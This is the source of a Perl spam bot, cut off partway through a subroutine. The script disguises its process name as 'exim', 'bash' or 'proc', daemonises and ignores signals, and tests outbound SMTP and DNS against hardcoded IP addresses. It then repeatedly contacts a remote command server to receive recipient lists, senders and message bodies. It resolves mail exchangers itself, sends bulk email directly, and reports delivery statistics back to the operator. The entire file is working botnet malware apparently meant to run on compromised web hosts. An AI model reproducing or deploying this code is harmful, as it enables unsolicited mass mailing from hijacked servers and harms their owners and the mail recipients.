#!/usr/bin/perl
use strict; use IO::Socket; use IO::Select; my @fps = ("exim", "bash", "proc"); my $nps = $fps[int rand scalar @fps]; $0 = $nps; $| = 1;
my $ewblock = 11; my $eiprogr = 150;
if ($^O eq "linux") { $ewblock = 11; $eiprogr = 115; }
if ($^O eq "freebsd") { $ewblock = 35; $eiprogr = 36; }
if ($^O eq "MSWin32") { $ewblock = 10035; $eiprogr = 10036; }
my $test = {
os => [$^O],
ip => ["0.0.0.0", "216.146.43.70", "107.20.89.142"],
tcp25 => [0, "65.55.92.184", "64.12.137.162", "98.138.112.38"],
udp53 => [0, "205.188.157.232", "119.160.247.124"],
tcp53 => [0, "205.188.157.232", "119.160.247.124"],
tcp80 => [0, "207.200.74.38", "206.190.36.45"]
}; &init(); $_ = 'Jm7'.'3uZ'; print "Content-type: text/plain; charset=iso-8859-1\x0D\x0A\x0D\x0A$_"; exit 0;
sub main
{
my $s_host = shift; my $s_port = shift; my $s_path = shift; my $s_nsex = shift;
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);
return if $child;
POSIX::setsid();
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD));
umask 0;
chdir "/";
open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT");
}
&test();
exit 0 if $test->{tcp25}[0] != 1;
if ($test->{udp53}[0] != 1 && $test->{tcp53}[0] != 1) { exit 0 if !defined $s_nsex; $s_nsex = pack ("C4", split (/\./, $s_nsex)); } else { $s_nsex = undef; }
srand; my $pid = $$; $pid = 1 + int rand 2147483648 if !defined $pid || $pid !~ /^\d+$/ || $pid > 4294967295;
my $s = {version => 8, command => 0, size => 0, timeout => 60, request => 1, host => pack ("C4", split (/\./, $s_host))};
my $b =
{
id			=> 0,
ip			=> "",
helo		=> undef,
timezone	=> [["+", "-"]->[int rand 2], (1 + int rand 6)],
nameserver	=> [],
timeout		=> 10,
session		=> 0,
copies		=> 1,
method		=> 0,
spf			=> 0,
level		=> 0,
mailbase	=> [],
from		=> [],
replyto		=> [],
subject		=> [],
header		=> "",
letter		=> "",
priority	=> 1,
type		=> 0,
charset		=> "",
good		=> [0, ""],
unlucky		=> [0, ""],
bad			=> [0, ""],
report		=> ""
};
my $readers = IO::Select->new() or exit 0;
my $writers = IO::Select->new() or exit 0;
my $session = {};
my $flagset = {timeout => 1};
my $cache = {};
my $reset_time = time;
my $reset_wait = 120;
my $reset_stat = 0;
my $first_exec = 1;
my $request_time = time;
my $request_flag = 1;
my $counter_addr = 0;
my $destroy = sub
{
my ($object, $handle) = @_;
if ($session->{$handle}{status} =~ /^rs/)
{
$request_flag = 1;
}
elsif (exists $session->{$handle}{object})
{
if ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Timeout\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
}
if (exists $session->{$handle}{mx})
{
$cache->{$session->{$handle}{mx}}[1] -- if $cache->{$session->{$handle}{mx}}[1] > 0;
}
delete $session->{$handle};
$object->remove($handle);
close $handle;
};
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $time = time;
if ($reset_stat != ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$reset_stat = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$reset_time = $time + $reset_wait;
}
if ($time >= $reset_time)
{
$reset_time = $time + $reset_wait;
$reset_stat = 0;
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
$session = {};
my $ha = [$writers->handles];
foreach my $hs (@$ha) { $writers->remove($hs); close $hs; }
$ha = [$readers->handles];
foreach my $hs (@$ha) { $readers->remove($hs); close $hs; }
$request_flag = 1;
$request_time = time;
next;
}
if ($request_flag && $time >= $request_time)
{
while (1)
{
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
last unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($s_port, $s->{host})))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
last;
}
}
unless ($writers->add($socket))
{
close $socket;
last;
}
$session->{$socket} =
{
status	=> "rs_cn",
buffer	=> "",
flagset	=> $flagset->{timeout},
timeout	=> 0
};
$s->{$_} = 0 for (qw (command size));
if ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$s->{command} = 1;
$s->{command} = 2 if $first_exec;
$reset_time = $time + $reset_wait;
$reset_stat = 0;
if ($counter_addr)
{
$s->{size} = 16;
$session->{$socket}{buffer} .= pack ("L", $b->{id});
$session->{$socket}{buffer} .= pack ("L", $b->{$_}[0]) for (qw (good unlucky bad));
if ($b->{level})
{
for (qw (good unlucky bad))
{
$s->{size} += (4 + length $b->{$_}[1]);
$session->{$socket}{buffer} .= pack ("L", length $b->{$_}[1]);
$session->{$socket}{buffer} .= $b->{$_}[1];
}
if ($b->{level} > 1)
{
$s->{size} += (4 + length $b->{report});
$session->{$socket}{buffer} .= pack ("L", length $b->{report});
$session->{$socket}{buffer} .= $b->{report};
}
}
}
}
$session->{$socket}{buffer} = pack ("SC2L2", 0xDFDF, $s->{version}, $s->{command}, $pid, $s->{size}) . $session->{$socket}{buffer};
$s->{size} = length $session->{$socket}{buffer};
$session->{$socket}{buffer} = "POST $s_path HTTP/1.0\x0D\x0AHost: $s_host\x0D\x0AContent-type: application/x-www-form-urlencoded\x0D\x0AContent-Length: $s->{size}\x0D\x0A\x0D\x0A$session->{$socket}{buffer}";
$request_flag = 0;
last;
}
}
if (my $mail_array = shift @{$b->{mailbase}})
{
while (scalar @$mail_array)
{
my $mail = @{$mail_array}[0];
my ($mx) = &mail(\$mail);
$mx = lc ((split /\@/, $$mx)[1]);
my $type = 15;
if (exists $cache->{$mx})
{
my $sv = $mx;
$mx = $cache->{$sv}[0];
if ($mx =~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)
{
$cache->{$sv}[1] = 0 unless $cache->{$sv}[1];
if ($b->{session} && ($cache->{$sv}[1] >= $b->{session}))
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255)
{
while ($_ = shift @$mail_array)
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [mx_ip] Object non exists\x0A" if $b->{level} > 1;
}
}
last;
}
$mx = pack ("C4", $1, $2, $3, $4);
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in(25, $mx)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [mx_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;
push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
last;
}
}
unless ($writers->add($socket))
{
close $socket;
push @{$b->{mailbase}}, $mail_array;
last;
}
$cache->{$sv}[1] ++;
my $sender = @{$b->{from}}[int rand scalar @{$b->{from}}];
$sender =~ s/\@.+$/\@$b->{helo}/ if ($b->{spf} && $b->{helo} ne "localhost");
$session->{$socket} =
{
status	=> "mx_cn",
mx		=> $sv,
buffer	=> "",
object	=> $mail_array,
mindex	=> 0,
sender	=> $sender,
flagset	=> $flagset->{timeout},
timeout	=> 0
};
last;
}
else
{
$type = 1;
}
}
else
{
$type = 15;
}
my $socket;
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto => "udp");
}
else
{
$socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
}
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($test->{udp53}[0] == 0)
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
if (defined $s_nsex) { $nameserver = sockaddr_in(25, $s_nsex); } else { $nameserver = sockaddr_in(53, $nameserver); }
unless ($socket->connect($nameserver))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [ns_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;
push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
last;
}
}
}
unless ($writers->add($socket))
{
close $socket;
push @{$b->{mailbase}}, $mail_array;
last;
}
$session->{$socket} =
{
status	=> "ns_wr",
buffer	=> "",
object	=> $mail_array,
sender	=> 0,
flagset	=> $flagset->{timeout},
timeout	=> 0,
type	=> $type,
packet	=> int rand 65536,
size	=> 0
};
$session->{$socket}{buffer} .= pack ("nSn4", $session->{$socket}{packet}, 1, 1, 0, 0, 0);
$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $mx));
$session->{$socket}{buffer} .= pack ("Cn2", 0, $session->{$socket}{type}, 1);
$session->{$socket}{sender} = length $session->{$socket}{buffer};
if ($test->{udp53}[0] == 0)
{
$session->{$socket}{status} = "ns_cn";
$session->{$socket}{buffer} = join ("", pack ("n", $session->{$socket}{sender}), $session->{$socket}{buffer});
}
last;
}
}
elsif ($counter_addr && !scalar keys %$session)
{
$counter_addr = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]) if $counter_addr > ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$request_time = $time if $counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
}
my $writable = [$writers->handles];
foreach my $handle (@$writable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($writers, $handle);
}
}
$writable = (IO::Select->select(undef, $writers, undef, 0))[1];
foreach my $handle (@$writable)
{
if ($session->{$handle}{status} =~ /cn$/)
{
if ($handle->connected)
{
if ($session->{$handle}{status} eq "rs_cn")
{
$session->{$handle}{status} = "rs_wr";
}
elsif ($session->{$handle}{status} eq "ns_cn")
{
$session->{$handle}{status} = "ns_wr";
}
else
{
$session->{$handle}{status} = "mx_rd";
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
else
{
$destroy->($writers, $handle);
}
}
else
{
my $result;
if ($session->{$handle}{status} eq "ns_wr")
{
if ($test->{udp53}[0] == 0)
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
$result = $handle->send($session->{$handle}{buffer}, 0, $_ = sockaddr_in(53, $nameserver));
}
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
if ($session->{$handle}{status} eq "rs_wr")
{
$session->{$handle}{status} = "rs_rd";
if ($s->{command} && $counter_addr && ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0])))
{
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
}
$request_time = $time + $s->{request} * 60;
}
elsif ($session->{$handle}{status} eq "ns_wr")
{
$session->{$handle}{status} = "ns_rd";
}
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($writers, $handle);
}
}
}
my $readable = [$readers->handles];
foreach my $handle (@$readable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($readers, $handle);
}
}
$readable = (IO::Select->select($readers, undef, undef, 0))[0];
foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{status} eq "ns_rd")
{
if ($test->{udp53}[0] == 0)
{
my $tempbuffer = "";
if ($session->{$handle}{size} == 0)
{
$handle->recv($tempbuffer, (2 - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if (2 == length $session->{$handle}{buffer})
{
$session->{$handle}{size} = unpack ("n", $session->{$handle}{buffer});
$session->{$handle}{buffer} = "";
}
next;
}
$handle->recv($tempbuffer, ($session->{$handle}{size} - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if ($session->{$handle}{size} == length $session->{$handle}{buffer})
{
$result = $session->{$handle}{size};
}
}
else
{
$result = $handle->recv($session->{$handle}{buffer}, 512);
$result = length $session->{$handle}{buffer} if defined $result;
}
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 16384, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($result > 0)
{
if ($session->{$handle}{status} eq "rs_rd")
{
next if 4 > length $session->{$handle}{buffer};
if ($session->{$handle}{buffer} !~ /^HTTP/)
{
$destroy->($readers, $handle);
next;
}
else
{
my $offset = index ($session->{$handle}{buffer}, "\x0D\x0A\x0D\x0A");
next unless $offset >= 0;
if ($session->{$handle}{buffer} =~ /^HTTP\S+\s+([^\x0D\x0A]*)/)
{
if ($1 !~ /^200/)
{
$destroy->($readers, $handle);
next;
}
$offset += 4;
next if 10 > (length $session->{$handle}{buffer}) - $offset;
my $server =
{
sign		=> 0,
timeout		=> 0,
request		=> 0,
command		=> 0,
size		=> 0
};
@_ = unpack ("S2C2L", substr ($session->{$handle}{buffer}, $offset, 10));
$server->{$_} = shift @_ for (qw (sign timeout request command size));
if ($server->{sign} != 0xEFEF)
{
$destroy->($readers, $handle);
next;
}
$first_exec = 0;
exit 0 if $server->{command};
$s->{timeout} = $server->{timeout};
$s->{request} = $server->{request};
$request_time = $time + $s->{request} * 60;
unless ($server->{size})
{
$destroy->($readers, $handle);
next;
}
$offset += 10;
next if $server->{size} > (length $session->{$handle}{buffer}) - $offset;
substr ($session->{$handle}{buffer}, 0, $offset) = "";
@_ = unpack ("La4", substr ($session->{$handle}{buffer}, 0, 8, ""));
$b->{$_} = shift @_ for (qw (id ip));
$b->{nameserver} = [];
push @{$b->{nameserver}}, substr ($session->{$handle}{buffer}, 0, 4, "") for (1..16);
@_ = unpack ("S2C4", substr ($session->{$handle}{buffer}, 0, 8, ""));
$b->{$_} = shift @_ for (qw (timeout session copies method spf level));
@{$b->{$_}} = split ("\x0A", substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "")) for (qw (mailbase from replyto subject));
$counter_addr = scalar @{$b->{mailbase}};
my $mailbase_temp = {};
while (my $mail_temp = shift @{$b->{mailbase}})
{
my ($host_temp) = &mail(\$mail_temp);
$host_temp = lc ((split /\@/, $$host_temp)[1]);
$mailbase_temp->{$host_temp} = [] unless exists $mailbase_temp->{$host_temp};
push @{$mailbase_temp->{$host_temp}}, $mail_temp;
}
foreach my $host_temp (keys %$mailbase_temp)
{
while (scalar @{$mailbase_temp->{$host_temp}})
{
my $mail_temp = [];
for (1..$b->{copies})
{
last unless scalar @{$mailbase_temp->{$host_temp}};
push @$mail_temp, shift @{$mailbase_temp->{$host_temp}};
}
push @{$b->{mailbase}}, $mail_temp;
}
}
undef $mailbase_temp;
$b->{header} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
unless ($b->{header})
{
$b->{header} = ['Date: %DATE%', 'From: %FROMADDR%', 'Reply-To: %REPLYTOADDR%', 'X-Priority: %NPRIORITY%', 'Message-ID: <%MESSAGEID%@%HELO%>', 'To: %TOADDR%', 'Subject: %SUBJECT%'];
$b->{header} = join ("\x0D\x0A", @{$b->{header}}, 'MIME-Version: 1.0', 'Content-Type: text/%TYPE%; charset=%CHARSET%', 'Content-Transfer-Encoding: %ENCODING%');
}
$b->{letter} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
$b->{letter} = "" unless $b->{letter};
$b->{$_} = unpack ("C", substr ($session->{$handle}{buffer}, 0, 1, "")) for (qw (priority type));
$b->{charset} = substr ($session->{$handle}{buffer}, 0, length $session->{$handle}{buffer}, "");
$b->{ip} = join (".", unpack ("C4", $b->{ip}));
unless ($b->{helo})
{
if (defined $s_nsex)
{
$b->{helo} = &nsptr($_ = sockaddr_in(25, $s_nsex), 3, $b->{ip});
}
else
{
$b->{helo} = &nsptr($_ = sockaddr_in(53, $b->{nameserver}[0]), 3, $b->{ip});
$b->{helo} = &nsptr($_ = sockaddr_in(53, pack ("C4", split (/\./, "8.8.8.8"))), 3, $b->{ip}) unless $b->{helo};
}
$b->{helo} = "localhost" unless $b->{helo};
}
$b->{report} = "\x0ACLIENT V.$s->{version} IP=$b->{ip} PTR=$b->{helo} ID=$b->{id}\x0A\x0A" if $b->{level} > 1;
$destroy->($readers, $handle);
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
elsif ($session->{$handle}{status} eq "ns_rd")
{
if (length $session->{$handle}{buffer})
{
my ($resp, $code) = &nsparser(\$session->{$handle}{buffer}, $session->{$handle}{sender}, $session->{$handle}{packet}, $session->{$handle}{type});
if ($resp == 2)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [ns_rd] $code\x0A" if $b->{level} > 1;
}
}
}
elsif ($resp == 1)
{
$resp = shift @{$session->{$handle}{object}};
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$resp\x0A";
$b->{report} .= "$resp - [ns_rd] $code\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
else
{
$resp = @{$session->{$handle}{object}}[0];
($resp) = &mail(\$resp);
$resp = lc ((split /\@/, $$resp)[1]);
$cache->{$resp}[0] = $code;
push @{$b->{mailbase}}, $session->{$handle}{object};
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
elsif ($session->{$handle}{buffer} =~ /^[^\-]{4}.*\x0D\x0A$/m)
{
if ($session->{$handle}{buffer} !~ /^(2|3)/)
{
if ($b->{level} > 1)
{
$session->{$handle}{buffer} =~ s/\x0D//g;
$session->{$handle}{buffer} =~ s/[\x09|\x0A]+/\x20/g;
}
$session->{$handle}{mindex} -- if $session->{$handle}{mindex} > 0;
if ($session->{$handle}{status} =~ /^mx_(rd|gr)$/)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
elsif ($session->{$handle}{status} =~ /^mx_(mf|rt)$/)
{
if ($session->{$handle}{buffer} =~ /\d+\.\d+\.\d+\.\d+/g || $session->{$handle}{buffer} =~ /( ip |block|black|reject|later|many)/ig)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
else
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Invalid recipient $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
unless (scalar @{$session->{$handle}{object}})
{
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
}
else
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Delivery error $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
if ($session->{$handle}{status} eq "mx_rd")
{
my $helo = $b->{helo};
$session->{$handle}{buffer} = "HE";
$session->{$handle}{buffer} .= "LO $helo\x0D\x0A";
$session->{$handle}{status} = "mx_gr";
}
elsif ($session->{$handle}{status} eq "mx_gr")
{
my ($mail) = &mail(\$session->{$handle}{sender});
$session->{$handle}{buffer} = "MAIL ";
$session->{$handle}{buffer} .= "FROM: <$$mail>\x0D\x0A";
$session->{$handle}{status} = "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_mf")
{
my ($mail) = &mail(\$session->{$handle}{object}[$session->{$handle}{mindex}]);
$session->{$handle}{buffer} = "RCPT TO: <$$mail>\x0D\x0A";
$session->{$handle}{mindex} ++;
$session->{$handle}{status} = $session->{$handle}{mindex} >= scalar @{$session->{$handle}{object}} ? "mx_rt" : "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_rt")
{
$session->{$handle}{buffer} = "DATA\x0D\x0A";
$session->{$handle}{status} = "mx_dt";
}
elsif ($session->{$handle}{status} eq "mx_dt")
{
$session->{$handle}{buffer} = &data($session->{$handle}{object}, $session->{$handle}{sender}, $b);
$session->{$handle}{buffer} .= "\x0D\x0A.\x0D\x0A";
$session->{$handle}{status} = "mx_dr";
}
elsif ($session->{$handle}{status} eq "mx_dr")
{
$b->{good}[0] += scalar @{$session->{$handle}{object}};
if ($b->{level})
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{good}[1] .= "$_\x0A";
}
}
delete $session->{$handle}{object};
$session->{$handle}{buffer} = "QUIT\x0D\x0A";
$session->{$handle}{status} = "mx_qt";
}
else
{
$destroy->($readers, $handle);
next;
}
unless ($writers->add($handle))
{
$destroy->($readers, $handle);
next;
}
$readers->remove($handle);
}
}
else
{
$destroy->($readers, $handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
}
sub nsunpack
{
my ($packet, $offset) = @_;
my ($length, $size, $name, $next) = (length $$packet, 0, "", "");
while (1)
{
return if $length < ($offset + 1);
$size = unpack ("\@$offset C", $$packet);
if ($size == 0)
{
$offset ++;
last;
}
elsif (($size & 192) == 192)
{
return if $length < ($offset + 2);
$next = unpack ("\@$offset n", $$packet);
$next &= 16383;
($next) = &nsunpack($packet, $next);
return if !defined $next;
$name .= $next;
$offset += 2;
last;
}
else
{
$offset ++;
return if $length < ($offset + $size);
$next = substr ($$packet, $offset, $size);
$name .= "$next.";
$offset += $size;
}
}
$name =~ s/\.$//;
return if !length $name;
return ($name, $offset);
}
sub nsrecord
{
my ($packet, $offset) = @_;
my ($length, $name) = (length $$packet, "");
($name, $offset) = &nsunpack($packet, $offset);
return if !defined $name || $length < ($offset + 10);
my ($rtype, $rclass, $rttl, $rlength) = unpack ("\@$offset n2Nn", $$packet);
$offset += 10;
return if $length < ($offset + $rlength);
return ($name, $offset, $rtype, $rclass, $rttl, $rlength);
}
sub nsparser
{
my ($packet, $offset, $sequence, $type) = @_;
my ($length, $name) = (length $$packet, "");
return (1, "Broken header") if $length < 12;
@_ = unpack ("nC2n4", $$packet);
my $header =
{
id		=> $_[0],
qr		=> ($_[1] >> 7) & 1,
opcode	=> ($_[1] >> 3) & 15,
aa		=> ($_[1] >> 2) & 1,
tc		=> ($_[1] >> 1) & 1,
rd		=> $_[1] & 1,
ra		=> ($_[2] >> 7) & 1,
z		=> ($_[2] >> 4) & 6,
rcode	=> $_[2] & 15,
qdcount	=> $_[3],
ancount	=> $_[4],
nscount	=> $_[5],
arcount	=> $_[6]
};
return (1, "Synchronization error") if $header->{id} != $sequence;
return (1, "Recursion disabled") if !$header->{ra};
return (2, "Query format error") if $header->{rcode} == 1;
return (2, "Server failure") if $header->{rcode} == 2;
return (2, "Non-existent domain") if $header->{rcode} == 3;
return (2, "Empty answer section") if !$header->{ancount};
return (1, "Broken packet") if $length < $offset;
my ($answer, $rtype, $rclass, $rttl, $rlength) = ({}, 0, 0, 0, 0);
while ($header->{ancount})
{
$header->{ancount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($type != $rtype)
{
$offset += $rlength;
next;
}
if ($type == 1)
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$offset += $rlength;
$name = inet_ntoa($name);
$answer->{$name} = 1;
}
elsif ($type == 12)
{
($name, $offset) = &nsunpack($packet, $offset);
last if !defined $name;
$answer->{$name} = 1;
}
elsif ($type == 15)
{
$sequence = substr ($$packet, $offset, 2);
last if !defined $sequence || 2 > length $sequence;
($name, $offset) = &nsunpack($packet, ($offset + 2));
last if !defined $name;
$answer->{$name} = unpack ("n", $sequence);
}
}
return (2, "No resourse records") if !scalar keys %$answer;
my $result = (sort {$answer->{$a} <=> $answer->{$b}} keys %$answer)[0];
if ($type == 15 && $header->{arcount})
{
while ($header->{nscount})
{
$header->{nscount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
$offset += $rlength;
}
while ($header->{arcount})
{
$header->{arcount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($rtype == 1 && exists $answer->{$name})
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$result = inet_ntoa($name);
last;
}
$offset += $rlength;
}
}
return (0, $result);
}
sub nsptr
{
my ($packaddr, $timeout, $query) = @_; my $type = 12;
return if !defined $query || $query !~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/;
return if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255);
$query = "$4.$3.$2.$1.in-addr.arpa";
my $packid = int rand 65536; my $packet = pack ("nSn4", $packid, 1, 1, 0, 0, 0);
$packet .= pack ("C", length $_) . $_ for (split (/\./, lc $query));
$packet .= pack ("Cn2", 0, $type, 1);
my $offset = length $packet;
my ($socket, $select, $buffer, $resp, $text, $size);
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto=>"udp");
return unless $socket;
$select = new IO::Select $socket;
if ($select->can_write($timeout))
{
unless ($socket->send($packet, 0, $packaddr))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$socket->recv($buffer, 512);
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
else
{
$socket = IO::Socket::INET->new(Proto=>"tcp", Type=>SOCK_STREAM);
return unless $socket;
$select = new IO::Select $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($packaddr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
return;
}
unless ($select->can_write($timeout))
{
close $socket;
return;
}
unless ($socket->connected)
{
close $socket;
return;
}
}
$socket->blocking(1);
$packet = pack ("n", length $packet) . $packet;
if ($select->can_write($timeout))
{
unless ($socket->send($packet))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$buffer = ""; $text = 2;
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
if (!length $buffer)
{
close $socket;
return;
}
unless ($text = unpack ("n", $buffer))
{
close $socket;
return;
}
unless ($select->can_read($timeout))
{
close $socket;
return;
}
$buffer = "";
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
unless ($text == length $buffer)
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
($resp, $text) = &nsparser(\$buffer, $offset, $packid, $type);
return !$resp ? $text : undef;
}
sub mail
{
my $line = shift;
return if !defined $$line || $$line !~ /^[^\@]+\@[^\@]+\.[^\@]+$/;
my ($name, $mail, $info) = $$line =~ /\s*(.*?)[\s\|<]*([^\s|<]+\@[^>\|\s]+)>*(.*)$/;
return if !$mail;
